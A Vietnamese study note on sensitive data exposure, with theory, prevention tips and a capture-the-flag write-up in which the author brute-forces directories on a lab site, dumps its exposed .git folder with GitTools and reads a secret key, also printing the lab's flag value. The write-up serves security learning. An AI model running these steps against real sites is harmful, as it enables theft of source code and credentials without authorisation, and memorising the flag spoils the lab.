I. Lý thuyết<br>
1. tiết lộ data nhạy cảm là gì<br>
- vul này xảy ra khi data bị lộ cho 1 user, người ko đc ủy quyền rõ ràng để truy cập vào data đó
- VD: password login, int4 riêng tư của user, ...<br>

2. cách để test<br>
- vul này ko thể tìm kiếm or test giống như các vul thông thg
- hầu hết các vul này đều ko thể scan
- VD:<br>
+ app lưu password của user ở dạng văn bản thuần túy
+ password dễ crack
+ API token bị lộ trong mã nguồn công khai (github)<br>
- VD thực:<br>
+ giả sử đang test 1 web trong khi xài dirb để brute-force các thư mục và tìm thấy 1 .git có sẵn
+ thư mục git giúp tìm thấy các vul mới bằng cách phân tích mã nguồn 
+ đồng thời tìm thấy các file chứa data nhạy cảm
+ download thư mục .git để kết xuất data (xài wget)
- dùng tool (https://github.com/internetwache/GitTools) or lệnh thủ công để kết xuất data:<br>
+ git status# -> trả về file đã bị xóa và thư mục trống
+ git checkout --.# -> khôi phục file và tải xuống thư mục
+ git log# -> xem có những commit nào khác
- một số cách khác để lấy data nhạy cảm:<br>
+ tìm file mã nguồn (.old, .bak, ..)
+ file ẩn
+ file JS
+ thư mục github (của mục tiêu)<br>

3. phòng tránh<br>
- tìm data nhạy cảm để bảo vệ
- sau khi bảo vệ, truy cập những data rủi ro này và đảm bảo:<br>
+ data ko đc lưu trữ ở dạng văn bản rõ ràng
+ data ko đc truyền dưới dạng văn bản rõ ràng mà phải xài HTTPS
+ xài thuật toán đủ phức tạp để mã hóa data
+ bảo mật việc tạo key<br>

4. tool<br>
- https://portswigger.net/
- brute-force thư mục: https://wiki.owasp.org/index.php/Category:OWASP_DirBuster_Project
- kết xuất 1 thư mục git từ 1 web: https://github.com/internetwache/GitTools<br>

II. lap: Maximum Courage<br>
1. phân tích url -> tìm ra thư mục .git: http://wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/.git/<br>

```
python3 dirsearch.py -u http://wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11723

Output: /root/dirsearch/reports/http_wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/__24-08-01_04-06-09.txt

Target: http://wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/

[04:06:09] Starting: 
[04:06:28] 301 -  417B  - /.git  ->  http://wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/.git/
[04:06:28] 200 -    3KB - /.git/                                            
[04:06:28] 200 -   23B  - /.git/HEAD
[04:06:28] 200 -  266B  - /.git/COMMIT_EDITMSG                              
[04:06:28] 200 -    3KB - /.git/hooks/
[04:06:28] 200 -  196B  - /.git/config
[04:06:28] 200 -  209B  - /.git/index                                       
[04:06:28] 200 - 1000B  - /.git/info/                                       
[04:06:28] 200 -  240B  - /.git/info/exclude                                
[04:06:29] 200 -    1KB - /.git/logs/                                       
[04:06:28] 200 -   73B  - /.git/description
[04:06:29] 200 -  148B  - /.git/logs/HEAD
[04:06:29] 301 -  427B  - /.git/logs/refs  ->  http://wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/.git/logs/refs/
[04:06:29] 301 -  433B  - /.git/logs/refs/heads  ->  http://wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/.git/logs/refs/heads/
[04:06:29] 200 -  148B  - /.git/logs/refs/heads/master
[04:06:29] 200 -    2KB - /.git/objects/                                    
[04:06:29] 200 -    1KB - /.git/refs/
[04:06:29] 301 -  427B  - /.git/refs/tags  ->  http://wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/.git/refs/tags/
[04:06:29] 200 -   41B  - /.git/refs/heads/master                           
[04:06:29] 301 -  428B  - /.git/refs/heads  ->  http://wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/.git/refs/heads/
[04:06:31] 403 -  351B  - /.ht_wsr.txt                                      
[04:06:32] 403 -  354B  - /.htaccess.bak1                                   
[04:06:32] 403 -  356B  - /.htaccess.sample                                 
```

2. tải thư mục về và phân tích: wget -r http://wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/.git 
<br>

3. thu được các file sau và phân tích -> file: flag.txt sai<br>

```
drwxr-sr-x  4 root root 4096 Aug  1 13:04 .
drwsr-sr-x 20 root root 4096 Aug  1 05:04 ..
drwxr-sr-x  6 root root 4096 Aug  1 05:01 .git
drwxr-sr-x  4 root root 4096 Aug  1 13:04 wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com
```

4. tìm đc file flag.php và mở xem<br>
```
──(root㉿kali)-[/moon/wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com]
└─# ls -la
total 24
drwxr-sr-x 4 root root 4096 Aug  1 13:04 .
drwxr-sr-x 4 root root 4096 Aug  1 13:04 ..
-rw-r--r-- 1 root root   89 Aug  1 13:04 flag.php
drwxr-sr-x 7 root root 4096 Aug  1 13:04 .git
drwxr-sr-x 2 root root 4096 Aug  1 13:04 icons
-rw-r--r-- 1 root root  455 Aug  1 13:04 index.html
```

```
cat flag.php                                                        
You can't view this flag directly.
<!-- PHP source doesn't appear on HTML comments -->
```

5. tìm đc 1 file .git trong cùng thư mục với file flag.php -> dùng tool để tải lại toàn bộ thư mục .git ban đầu<br>
```
┌──(root㉿kali)-[~/GitTools/Dumper]
└─# ./gitdumper.sh http://wlemxwl32epheze6eg23gmgi834kj6zq9oj9s6z9-web.cybertalentslabs.com/.git/ ./moon1
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating ./moon1/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/ca/432659ef19b8e1cfd6607878c4eb5a778dc37d
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/08/48654ac283468f006838972da074064826f6e9
[+] Downloaded: objects/f3/df28f6e6614d7753ba2e5c45447fde1a99671a
[+] Downloaded: objects/c2/72c09bb7c1a565df8230f07f0e29db84fd676e
```

6. khôi phục lại các file ban đầu trong thư mục .git<br>
```
──(root㉿kali)-[~/GitTools/Extractor]
└─# ./extractor.sh /root/GitTools/Dumper/moon1 ./moon2

###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
[*] Destination folder does not exist
[*] Creating...
[+] Found commit: ca432659ef19b8e1cfd6607878c4eb5a778dc37d
[+] Found file: /root/GitTools/Extractor/./moon2/0-ca432659ef19b8e1cfd6607878c4eb5a778dc37d/flag.php
[+] Found file: /root/GitTools/Extractor/./moon2/0-ca432659ef19b8e1cfd6607878c4eb5a778dc37d/index.php
```

7. tìm kiếm file flag.php<br>
```
┌──(root㉿kali)-[~/GitTools/Extractor/moon2]
└─# ls -la
total 12
drwxr-xr-x 3 root root 4096 Aug  1 13:41 .
drwxr-xr-x 3 root root 4096 Aug  1 13:41 ..
drwxr-xr-x 2 root root 4096 Aug  1 13:41 0-ca432659ef19b8e1cfd6607878c4eb5a778dc37d
```

```
┌──(root㉿kali)-[~/GitTools/Extractor/moon2/0-ca432659ef19b8e1cfd6607878c4eb5a778dc37d]
└─# ls -la
total 20
drwxr-xr-x 2 root root 4096 Aug  1 13:41 .
drwxr-xr-x 3 root root 4096 Aug  1 13:41 ..
-rw-r--r-- 1 root root  147 Aug  1 13:41 commit-meta.txt
-rw-r--r-- 1 root root  160 Aug  1 13:41 flag.php
-rw-r--r-- 1 root root  449 Aug  1 13:41 index.php
```

8. đọc thư mục flag.php: be607453caada6a05d00c0ea0057f733<br>
```
──(root㉿kali)-[~/GitTools/Extractor/moon2/0-ca432659ef19b8e1cfd6607878c4eb5a778dc37d]
└─# cat flag.php                                 
You can't view this flag directly.
<!-- PHP source doesn't appear on HTML comments -->
<?php
exit();
die();
$secret_key = 'be607453caada6a05d00c0ea0057f733';
?>
```
